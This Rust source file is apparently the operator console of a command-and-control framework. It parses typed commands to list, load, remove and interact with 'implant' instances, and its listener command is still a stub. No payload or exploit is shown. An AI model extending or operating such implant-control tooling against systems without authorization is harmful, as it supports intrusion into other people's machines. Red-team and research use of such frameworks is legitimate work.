mod error;
mod types;
mod utils;
mod config;
mod cipher;
mod stream;
mod session;
mod instance;
mod parser;
mod builder;
mod binary;
mod format;

use serde_json;
use serde::Deserialize;
use lazy_static::lazy_static;

use rand::Rng;
use std::io::{self, Write};
use core::fmt::Display;
use std::str::FromStr;
use std::sync::Mutex;

use self::session::{init};
use self::utils::{cursor, wrap_message, stop_print_channel};
use self::instance::{Hexane, load_instance, interact_instance, remove_instance};
use crate::server::format::list_instances;
use crate::{invalid_input, length_check_continue};
use crate::server::instance::print_instance;

lazy_static!(
    static ref INSTANCES: Mutex<Vec<Hexane>> = Mutex::new(vec![]);
);

pub fn run_client() {
    init();

    loop {
        cursor();

        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();

        let input = input.trim();
        if input.is_empty() {
            continue;
        }

        let args: Vec<String> = input.split_whitespace().map(str::to_string).collect();

        if args[0].as_str() == "exit" {
            break;
        } else {
            length_check_continue!(args, 2);
        }

        match args[0].as_str() {
            "implant" => {

                length_check_continue!(args, 2);
                match args[1].as_str() {
                    "ls"    => { list_instances().unwrap_or_else(|e| wrap_message("error", e.to_string())) },
                    "load"  => { load_instance(args).unwrap_or_else(|e| wrap_message("error", e.to_string())) },
                    "rm"    => { remove_instance(args).unwrap_or_else(|e| wrap_message("error", e.to_string())) },
                    "i"     => { interact_instance(args).unwrap_or_else(|e| wrap_message("error", e.to_string())) },

                    _ => invalid_input!(args.join(" ").to_string())
                }
            },

            "listener" => {
                length_check_continue!(args, 2);
                match args[1].as_str() {

                    // todo: "attach" - find implant by name and attach an associated listener
                    "attach" => { todo!() },

                    _ => invalid_input!(args.join(" ").to_string())
                }
            }

            _ => {
                wrap_message("error", format!("invalid input: {}", args[0]));
                continue;
            }
        }
    }

    stop_print_channel();
}
